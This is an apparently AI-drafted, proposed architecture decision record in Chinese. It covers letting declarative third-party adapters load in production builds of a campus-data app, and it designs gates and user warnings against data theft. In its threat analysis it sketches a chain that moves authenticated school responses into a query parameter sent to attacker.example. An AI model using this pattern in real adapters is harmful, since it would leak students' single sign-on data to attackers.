# ADR-033：生产侧载档（DEPLOY 下的声明式第三方 adapter）

- **状态**：📋 提议（Proposed，AI 起草）。**未接受前不得合并任何实现代码。** 本文放宽的是红线 #4/#5 在 DEPLOY 下的侧载语义，属信任模型承重改动，按 [AGENTS.md](../../AGENTS.md) §1：**AI 不得独自闭环**，须人工主导评审 + 安全检查清单 + ≥1 人工审。
- **日期**：2026-08-09
- **适用范围**：**DEPLOY profile 下能否存在非 official adapter、其能力面、分发与告知义务**。**不含**：签名机制与 official 铸造（ADR-002 §2.3 / ADR-018）、凭证注入与脱敏实现（ADR-009/026/029）、DEV 侧载（ADR-002 §2.5 不变）、传输底座（红线 #4 第二句逐字不变）。
- **触及红线**：#1（凭证永不离开核心）、#4（DEPLOY 包内无侧载入口）、#5（adapter 能力面）、#10（架构性改动先写 ADR）
- **依赖**：
  - [`ADR-002`](./adr_002_trust_model.md)（§2.1 两轴、§2.5 侧载闸门、§2.6 纵深防御——本文提议修订 §2.5/§2.6）
  - [`ADR-010`](./adr_010_ios_appstore.md)（§2.1 DPLA §3.3.2 三段论——本文以 iOS 豁免保住 (b) 腿）
  - [`ADR-022`](./adr_022_request_graph.md)（§2.3「sideload ⟹ 每个 capability declarative」的现行约束）
  - [`ADR-023`](./adr_023_declarative_dataflow.md)（§2.5 污点三约束与分期、**§2.6 防扩散条款——本文是该条款的触发事件**）
  - [`ADR-024`](./adr_024_build_profile_trust.md)（§2.2 profile 矩阵——本文提议加平台维度）
  - [`ADR-028`](./adr_028_declarative_crypto_ops.md)（compute 词表含 md5/sha/aes，影响外泄链的表达力）

---

## 1. 背景：一个已经存在的矛盾

本文**不是**新开一个口子，而是**消解仓库里一处既有矛盾**。

红线 #5 逐字写着：

> 能力面的硬约束不变：**release 下**第三方 / 侧载 adapter 的**每个 capability 必须是 declarative requestGraph**（无网络、无凭证、无副作用）。

这句话的前提是「release 下侧载 adapter 存在，只是被限死为声明式」。而 ADR-002 §2.5 写的是：

> **release 维持原约束不变**：release 下侧载入口**根本不存在**；任何非 official adapter 无加载路径。

两者矛盾。而代码**分层地各实现了一边**：

| 层 | 现状 | 站哪边 |
|---|---|---|
| `contract/manifest.schema.json` | `trustTier` enum = `["official", "sideload"]` | 红线 #5 |
| `tools/src/validator`（C3） | `sideload` ⟹ 每个 capability 必须 `declarative` | 红线 #5 |
| `client/lib/core/loader/verify.dart:196` | 验签档位 `!= official` 一律拒 | ADR-002 §2.5 |

即：**`sideload` 是一个已经铺好、validator 已在守、但运行时拒绝激活的休眠契约挂钩。** 本文提议激活它，并补齐激活所必需的约束。

### 1.1 动机

social：社区开发者只调 adapter、不改核心（ADR-024 §1 的同一批人）。他们写出的 adapter 要给同学试用，目前唯一路径是「等官方铸造」。official 铸造是人工审 + 硬件签名的重流程，**把它设为唯一路径等于把新学校/新数据源的供给侧卡死在 owner 一个人的带宽上**——这与 ADR-000「在最少人力下对学校接口变动保持韧性」的第一目标相悖。

---

## 2. 决策（提议）

### 2.1 DEPLOY 下允许**声明式**侧载 adapter，平台受限

| profile × 平台 | 侧载入口 | 可跑 imperative | 判别机制 |
|---|---|---|---|
| **DEPLOY · iOS** | **编译期剔除（无任何侧载入口）** | 否 | 平台条件编译 |
| **DEPLOY · Android / Windows / Linux / macOS** | **编入，仅接受 declarative** | **否**（imperative 路径仍编译期剔除） | 信任 profile + 平台条件编译 |
| **DEV**（全平台） | 编入 | 是（ADR-002 §2.5 不变） | `ELECON_TRUST_PROFILE=dev-sideload` |

> **macOS 归入桌面端**：ADR-010 的合规约束针对 **iOS App Store 提交产物**；macOS 若走 App Store 分发，须按 §2.6 同样豁免。**首个实现批次建议只做 Android + Windows + Linux**，macOS 待分发形态定了再开。

**不新增第三个 profile。** ADR-024 §5.1「仅 DEPLOY + DEV」的终定结论**不推翻**——iOS 的零侧载是**平台维度**的条件编译，不是一个新的信任档。判别式为 `kSideloadEnabled ∧ ¬kIsIOS`（两者皆编译期常量，DEPLOY-iOS 下整段死代码剔除）。

### 2.2 为什么「declarative」四个字本身不够（本文的核心发现）

红线 #5 的括号「无网络、无凭证、**无副作用**」，是 `declarative == 纯解析宿主取回的响应` 那个时代的定义。**[ADR-023](./adr_023_declarative_dataflow.md) 把 declarative 扩宽到「多请求 + 跨请求数据流」之后，这句约束的实际强度已经改变**——只因 `sideload` 进不了生产，从未暴露。

具体地，下述外泄链**完全落在 declarative 内、零点击、adapter 全程不调 `ctx.fetch` 也不看句柄值**：

```
requests[a]  → 学校端点          （broker 按 credentials.scope 注入登录态）
  bind    { var: v, from: "a", extract: ... }        ← 从已认证响应取值
  compute { ... }                                    ← 可选变换（ADR-028 含 md5/sha256/aes-cbc）
  inject  { var: v, into: "b", at: "url", name: "d" } ← 追加 query 参数
requests[b]  → https://attacker.example/collect?d=<被窃数据>   ← **broker 亲自发出**
```

成立所依赖的事实（均已查证）：

- `network.allow` **完全由 manifest 自声明**，无任何外部 host 约束；
- `inject.at` 枚举含 `"url"`，语义即「追加 query 参数」；`inject.into` 可为本 capability 任意 `requests[].key`；
- `tools/src/validator` 中按 `trustTier` 设的闸门**只有两处**：C3（sideload ⟹ declarative）与 ssoMint 的 official-only。**`bind`/`compute`/`inject` 不按信任档设闸。**

ADR-023 §2.5 开篇已经点明这个道理：

> **「adapter 看不到值」是必要不充分**——adapter 控制数据流程序，若能对秘密值运算并观测到依赖结果的效果，就能一位位套出值（预言机 / 侧信道），全程不看内容。

### 2.3 ADR-023 已写明：这一威胁当前**只**由「人工审 + 签名」兜着

三处原文连起来即为结论：

- §2.5 分期：「MVP 先不上污点标记 + 禁分支/禁回读的自动围栏；此期**替代闸门 = official 人工审**」
- §2.5 Threat scoping：「恶意 official 作者 + 自控某白名单端点、读其日志」**不属本安全模型**……归 **official = 人工审 + 签名** 兜，非污点职责」
- §2.6 🔒 防扩散条款：「本决策**只绑定「`devSideload` 结构上仅存在于 DEV 构建」这一事实**……若将来新增任何**在生产环境中可存在的**第三方 / 非 official 档，它**不自动继承**本决策，必须就 dataflow 能力面重新裁定」

**本 ADR 就是 §2.6 防扩散条款的触发事件。** 生产侧载档拆掉的，恰好是 ADR-023 唯一依赖的那道闸门。故 §2.4 的能力面裁定**不可省略**，且必须是**闸门**而非告知。

### 2.4 生产侧载档的能力面（闸门，非告知）

`trustTier: sideload` 在 DEPLOY 下：

| # | 约束 | 依据 |
|---|---|---|
| **G1** | 每个 capability `requestGraph` 必须 `declarative`（现行 C3，提升为**运行时**亦强制，不止分发路径） | 红线 #5、ADR-022 §2.3 |
| **G2** | **禁 `bind` / `compute` / `inject`**——生产侧载 capability 退回「宿主按 `requests[]` 代取 → adapter 纯解析 → 出 emits」 | §2.2/§2.3；ADR-023 §2.6 重裁 |
| **G3** | `network.allow` 与 `requests[].url` 的 host **须落在该学校的官方域集合内**；集合来自内置学校目录（将来随签名 catalog 下发），**不接受 manifest 自声明域** | §2.2 第一条事实 |
| **G4** | 不得声明 `login`、`ssoMint`、`credentials[].role: sso-master` | 红线 #1；ADR-017 |
| **G5** | 不得引入 `contract/capability/registry.json` 之外的 capability id | ADR-010 §2.1(a)、ADR-018 §2.5 |
| **G6** | 输出仍过核心边界 schema gate（P0-08）与 ADR-026 delivery firewall | 红线 #6 |

**G2 与 G3 的分工**：G2 断掉「把 A 的数据搬到 B」的数据通道；G3 断掉「B 是攻击者可控 host」这个前提。两者**独立成立、互为兜底**——只做 G2，adapter 仍可用 `requests[]` 的发生与否做信标（泄露「用了没用」，不泄内容）；只做 G3，若某官方域下有可控的日志端点，G2 缺席时数据仍可外传。故**两条都要**。

> **G2 的代价与再评估条件**：禁 dataflow 意味着需要跨请求依赖的数据源（挑战应答、动态分页）**无法以侧载形态提供**，只能走 official。这是刻意的——那类请求图正是 ADR-023 §2.5 判定「须人工审」的形态。**再评估触发点 = ADR-023 §2.5 的污点自动围栏落地**；届时可就 G2 单独重裁，不必重开本 ADR。

### 2.5 告知义务（三级警告，是义务不是闸门）

§2.4 是闸门；本节是**在闸门之上**对残余风险的告知。owner 2026-08-09 立场：**侧载须用户手动下载并在应用内显式指定，尽到告知义务后，剩余选择属用户自由。**

**级别一 · 未签名 + 不可吊销**：明确告知该 adapter 未经审查、**且一旦加载无法被远程吊销**（§3 风险 1）。

**级别二 · 域对照**：列出该 adapter 会访问的全部 host，**判据是「是否属于本校官方域集合」，不是 TLD 后缀**。

> 🔒 **刻意不用 `edu.cn` 作判据。** 两个理由：① 学校自身的域**必然**在 allow 内，落在校内可控/失陷主机上的外泄端点会**显示为绿色**——而这正是 ADR-023 §2.5 Threat scoping 点名的场景；② `.edu.cn` 可注册、可失陷，「TLD 后缀」不是「这是不是这所学校」。用 TLD 作判据会**在最危险的形态上给绿灯、在无害的第三方 CDN 上标红**，信号方向是反的。

**级别三 · 数据流结论**：不只列域名，**把外泄形态算出来用一句话说清**。

manifest 的相关字段全部静态声明，无需运行即可判定（已查证）：

```
requests[] : key, url, credential           ← 哪条请求带登录态、发往哪
bind[]     : var, from(= requests[].key)    ← 值来自哪条响应
inject[]   : var, into(= requests[].key), at, name   ← 注入到哪条请求
```

判定算法：对每个 `inject`，把 `inject.var` 经 `compute` 链回溯到其 `bind`，取 `bind.from` 源请求的 host 与 `credential` 有无，与 `inject.into` 目标请求的 host 比对。**源带凭证 ∧ 目标异 host ⟹ 外泄形态。** 此图遍历与 validator 现有 D12/D15（依赖图/无环）同一套，复用即可。

> **本 ADR 下 G2 已禁 dataflow，故级别三在生产侧载上恒不触发。** 保留它有两个理由：① 它是 DEV 侧载（ADR-002 §2.5，dataflow 仍开放）的告知手段；② G2 若因 §2.4 的再评估条件解禁，级别三就是解禁的前置。

参考形态（UI 细节不入契约）：

```
⚠ 未签名 adapter · 无法吊销

此 adapter 会用你的「西安电子科技大学」登录态访问：
  ✓ ehall.xidian.edu.cn
  ✓ jwc.xidian.edu.cn
并将上述响应中的内容发送到：
  ⛔ collect.example.io        ← 非本校官方域
你的校园统一认证同时用于邮箱 / 图书馆 / 一卡通。

[ 取消 ]                    [ 我理解风险，仍要加载 ]
```

**SSO 连带面必须写进文案**：用户同意的是「一个 adapter」，暴露的是「统一认证能开的全部」。这个不对称他应当知道。

**每 `adapterId` 首次确认**（沿用 ADR-002 §2.5 的 dev 侧载形态），不设「不再提示」。

### 2.6 ADR-010（App Store）：以 iOS 豁免保住 (b) 腿

ADR-010 §2.1 的 DPLA §3.3.2 三段论中，**(b)「非代码市场」建立在「release 无侧载入口」上**。§2.1 的平台矩阵使这条腿**对提交给 App Store 的产物逐字仍然成立**——DEPLOY-iOS 无任何侧载入口。

需要的修订因此从「重写合规论证」降级为「把断言标注为平台限定」：

- §2.3 / §5 的「构建期断言：iOS release build 无侧载 / 未签名 adapter 加载路径」→ 明确为 **iOS 专属断言**，并接入 ADR-024 的 release gate（见 §4）。
- §2.4 对审核员的三句话中「无侧载入口 → 非代码市场」保留，但在内部文档注明**该句仅对 iOS 产物成立**，不得用于描述 Android/桌面产物。
- (a)「固定能力集」由 G5 承接；(c)「QuickJS 无 JIT」不受影响。

---

## 3. 已知约束与残余风险

1. **🔒 侧载 adapter 不可吊销（owner 明示接受，2026-08-09）。** 无签名即无 keyId、不进 revocation list，一旦用户本机加载，**没有远程召回手段**。缓解**只能**靠把能力面压到「即使永久留存也不致命」——这正是 §2.4 G1–G6 不可退让的理由。**本残余风险须逐字写进级别一警告。**
2. **告知不是闸门。** §2.5 三级警告降低的是「用户不知情」，不降低「用户知情后仍被坑」的技术可能性。警告疲劳是已知的、无法用更多文案解决的问题。
3. **G3 依赖学校官方域集合的质量。** 该集合目前来自内置目录（随 app 发版），非签名下发。集合过宽 = G3 变弱；集合过窄 = 合法 adapter 被误拒。签名 catalog 下发（ADR-018 §2.5）落地后应迁移。
4. **信标面**（G2 之后的残余）：侧载 adapter 仍可通过「是否发起某条 `requests[]`」泄露极低带宽的信息。因 G3 限定 host 在本校域内，接收方须是校内可控主机，与 ADR-023 §2.5 Threat scoping 出范围的那类相同。**接受。**
5. **平台不对称是长期负担。** 同一份 adapter 在 iOS 不可用、在桌面可用，会产生用户困惑与文档负担。这是 ADR-010 合规约束的必然代价。

---

## 4. 连带修订清单（本 ADR 接受后逐项执行）

| 目标 | 改什么 | 谁执行 |
|---|---|---|
| **AGENTS.md 红线 #4** | 「DEPLOY 包内无侧载入口」→「DEPLOY 包内无 **imperative** 侧载入口；**iOS 产物无任何侧载入口**」。第二句「dev 传输只在 debug build 存在」**逐字保留** | 🔒 **owner 人工落地**（红线原文） |
| **AGENTS.md 红线 #5** | 澄清括号「无网络、无凭证、无副作用」的当代含义：`declarative` 经 ADR-023 扩宽后已含跨请求数据流，故对**生产**侧载须叠加本文 G2/G3 才回到该括号的原意 | 🔒 **owner 人工落地**（红线原文） |
| **ADR-002** | §2.5 增「生产侧载档」一节（DEV 语义不变）；§2.1「release 维持 `sideload ⊆ official`」限定为 imperative；§2.6 防御表增运行时档位×能力面一行 | 随本 ADR 接受 |
| **ADR-010** | §2.3/§5 断言标平台限定；§2.4 话术加内部注（见 §2.6） | 随本 ADR 接受 |
| **ADR-022** | §2.3「sideload ⟹ declarative」补注：该约束在生产档下**不足以**独立成立，须叠加 G2/G3 | 随本 ADR 接受 |
| **ADR-023** | §2.6 按防扩散条款重裁：生产侧载档**不继承** official 的 dataflow 能力面（= G2）；§2.5 注明「替代闸门 = official 人工审」不覆盖生产侧载 | 随本 ADR 接受 |
| **ADR-024** | §2.2 矩阵加平台维度；§5.1 保留「仅两 profile」结论并注明 iOS 豁免走平台条件编译；§2.3 护栏 4 的符号断言语义调整（见下） | 随本 ADR 接受 |
| **ADR-001 §5.2** | C3 的适用范围由「分发/签名路径」扩到运行时 | 随本 ADR 接受 |
| **ADR-018** | 生产侧载包不经四信任域的 D（本地文件导入），须写明它**不在** catalog/revocation 治理内 | 随本 ADR 接受 |

### 4.1 对已落地 release gate 的影响（🔒 会变弱，须知情）

ADR-024 §2.3 护栏 4a 现以「DEPLOY 产物内侧载入口哨兵出现 0 次」作**结构性**断言（2026-08-07 已落地并实测）。本 ADR 接受后：

- **DEPLOY-iOS**：断言**不变**，仍是最强的 0 次符号断言。
- **DEPLOY-Android/桌面**：侧载加载路径**必须存在于产物中**，0 次断言不再适用。须改为断言 **imperative 侧载路径**的哨兵为 0 次——即哨兵要从「侧载入口」下移到「侧载-imperative 凭证注入分支」，并为 G1/G2 的运行时闸门补独立的负例测试。

**这是一次实打实的强度下降**，须在安全签收时明示。2026-08-07 的实测已证明护栏 4b（元数据标记）会被 gradle 构建缓存击穿、当时全靠 4a 兜住；4a 在桌面/Android 变弱后，G1/G2 的**运行时**闸门测试就是新的最后一道，不可省。

---

## 5. 开放问题（须 owner 勾决后方可实现）

1. **G2 是否采纳？** 本文建议禁 dataflow。若 owner 认为代价过大，替代方案是「G3 单独承担 + 级别三警告」——但那把「数据能否搬出去」从闸门降级为告知，与 §2.3 的结论冲突，**本文不建议**。
2. **G3 的域集合从哪来？** 短期用内置学校目录；是否要求随签名 catalog 下发（ADR-018 §2.5）作为接受本 ADR 的前置？
3. **侧载包的导入形态**：单文件 bundle（复用 ADR-018 的 envelope 格式但无签名段）还是目录？是否要求 manifest digest 显示给用户以便社区互相核对？
4. **macOS 归属**：走 App Store 则须同 iOS 豁免；若只做 DMG 直分发则归桌面端。取决于分发形态决策。
5. **首批平台范围**：建议 Android + Windows + Linux，macOS 待 4 决定。

---

## 6. 修订记录

| 日期 | 内容 |
|---|---|
| 2026-08-09 | 初版（AI 起草，Proposed）。起因：owner 倾向「DEPLOY = declarative-only 侧载」而非「DEPLOY 零侧载」。查实外泄面后确认 declarative 四字本身不足，补 §2.4 能力面闸门；owner 同期勾定 iOS 条件编译豁免、桌面/Android 保留侧载、侧载不可吊销属明示接受、告知义务三级形态与「域对照不用 edu.cn 判据」。 |
